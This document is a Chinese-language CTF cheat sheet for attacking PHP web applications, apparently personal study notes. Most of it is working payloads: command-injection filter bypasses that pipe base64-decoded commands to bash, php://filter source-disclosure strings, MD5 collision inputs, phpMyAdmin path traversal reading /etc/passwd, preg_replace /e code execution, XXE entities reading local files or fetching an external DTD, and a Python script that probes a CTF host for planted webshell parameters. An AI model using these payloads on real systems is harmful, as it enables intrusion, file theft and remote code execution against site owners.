

# PHP

* ## 基础

Robots.txt 查看robots协议规定的网站信息（对网站本身并无实质性影响）

备份源码泄露：

```
www.zip
www.tar.gz
index.php.bak
```

弱口令爆破：burp抓包后更改爆破点，加载字典进行爆破

X-Forward-For / Referer 伪造 --&gt; X-Forward-For 为最初发起请求的客户端的ip地址，Referer 为当前请求页面的来源页面地址

php弱类型对比（==），不涉及数据转换 --&gt; 0e123==0e456 （典型：md5碰撞）

php伪协议：

```
php://input  //通过post方法将原数据远程上传至服务器
php://filter //通过一些过滤将原数据进行一些操作后下载（可以嵌套一层别的协议）如/index/
?file=php://filter/read=convert.base64-encode/resource=flag.php
        //将flag.php内部源码进行base64编码后给file赋值
```

* ### 命令注入

HTML注入：

```
127.0.0.1;var_dump(scandir('/'));   //显示根目录下文件列表
127.0.0.1;file_get_contents(filename);  //获取文件内容
```

* #### Bypass

空格绕过 --&gt; 采用&lt;&gt;、/\*\*/、采用特殊变量$IFS

利用反斜杠

```
cat /flag ==> c\at /fl\ag
```

base64编码和解码

```
echo Y2F0IC9mbGFn|base64 -d|bash
```

过滤斜杠 --&gt;利用环境变量进行字符串截取

利用单引号绕过

拼接：

```
/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

编码：

```
/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash
```

内联：

    /?ip=127.0.0.1;cat$IFS$9`ls`

* #### md5碰撞

md5弱碰撞

```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```

md5强碰撞（做md5后值相同的字符串对）

```
a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2
b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2
```

特殊md5 \($a==md5\($a\)\)

```
0e215962017
```

* #### 备份源码泄露

脚本扫描是否有shell

```
import os
import requests
import re
import time

def read_file(path, command):  #遍历文件找出所有可用的参数
    with open(path,encoding="utf-8") as file:
        f = file.read()
    params = {}
    pattern = re.compile("(?<=\$_GET\[').*?(?='\])")  #match get
    for name in pattern.findall( f ):
        params[name] = command

    data = {}
    pattern = re.compile("(?<=\$_POST\[').*?(?='\])")  #match get
    for name in pattern.findall( f ):
        data[name] = command
    return params, data

def url_explosion(url, path, command):   #确定有效的php文件
    params, data = read_file(path,command)
    try:
        print("Reading " + url + "\r", end='', flush = True)
        r = requests.session().post(url, data = data, params = params)
        if r.text.find("haha") != -1 :
            print(url,"\n")
            find_params(url, params, data)         

    except:
        print("\n" + url,"异常")

def find_params(url, params, data):   #确定最终的有效参数
    try:
        for pa in params.keys():
            temp = {pa:params[pa]}
            r = requests.session().post(url, params = temp)
            if r.text.find("haha") != -1 :
                print(pa)
                os.system("pause")

    except:
        print("error!\n")
    try:
        for da in data.items():
            temp = {da:data[da]}
            r = requests.session().post(url, data = temp)
            if r.text.find("haha") != -1 :
                print(da) 
                os.system("pause")
    except:
        print("error!\n")


rootdir = "C:\\CTF\\buuctf\\高明的黑客\\src"  #php文件存放地址
list = os.listdir(rootdir)
for i in range(0, len(list)):
    path = os.path.join(rootdir ,list[i])
    name = list[i].split('-2')[0]   #获取文件名
    url = "http://1e688c83-cf4c-4675-b569-6e227ff69914.node3.buuoj.cn/" + name
    url_explosion(url,path,"echo haha")
```

* #### phpMyAdmin数据库

后缀加/phpmyadmin进入数据库

文件包含漏洞

payload：

```
?target=db_sql.php%253f/../../../../../../../../etc/passwd
?target=db_sql.php%253f/../../../../../../../../flag
```

实例：

```
$text = $_GET["text"];
file_get_contents($text,'r')==="I have a dream"     //形如该种判断语句采用php伪协议php://input进行传值
```

* ### preg_replace 漏洞：

```
preg_replace('/(' . $re . ')/ei','strtolower("\\1")',$str)          //preg_replace 的 /e 模式存在RCE
```

payload：

```
/?.*={${phpinfo()}}    //phpinfo()可替换为任意想要执行的代码
\S*=${phpinfo()}
```



* ## XML注入（构造恶意对象）
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe[
    <!ENTITY abc SYSTEM "file:///flag">
    ]>
<user><username>&abc;</username><password>a</password></user>
```

* 原理：XML基础知识
  XML基础架构：

* ```
  <?xml version="1.0" encoding="UTF-8"?>  //XML声明
  
  <!DOCTYPE a[
  	<!ELEMENT note (to,from,heading,body)>
  	<!ELEMENT to      (#PCDATA)>
  	<!ELEMENT from    (#PCDATA)>
  	<!ELEMENT heading (#PCDATA)>
  	<!ELEMENT body    (#PCDATA)>
  ]>						//DTD文档类型定义（可选）
  
  <note>
  <to>George</to>
  <from>John</from>
  <heading>reminder</heading>
  <body>Don't forget the meeting!</body>
  </note>					//文档元素
  ```

* 内部声明DTD：

  根元素 [元素声明]>

* 引用外部DTD

  根元素 SYSTEM "文件名">

  或

  根元素 PUBLIC "public_ID" "文件名">

* 内部声明实体

  实体名称 "实体的值">

* 引用外部实体

  实体名称 SYSTEM "URI">

  或

  实体名称 PUBLIC "public_ID" "URI">

* 恶意引入外部实体1：

* ```
  <?xml version="1.0"?>
  <!DOCTYPE a[
  	<!ENTITY b SYSTEM "file:///flag">
  ]>
  <c>&b;</c>
  ```

* 恶意引入外部实体2：

* ```
  <?xml version="1.0"?>
  <!DOCTYPE a[
  	<!ENTITY % d SYSTEM "http://mark4z5.com/evil.dtd">
  	%d;
  ]>
  <c>&b;</c>
  ```

  其中DTD文件（evil.dtd）内容：

  ```
  <!ENTITY b SYSTEM "file:///flag">
  ```

* 恶意引入外部实体3：
  
* ```
  <?xml version="1.0"?>
  <!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd">
  <c>&b;</c>
  ```
  


* ## Unicode编码

* Unicode安全编码：可以通过一个字符代表数字

* ==> 亿 = 100000000.0

* ## Extract 变量赋值漏洞





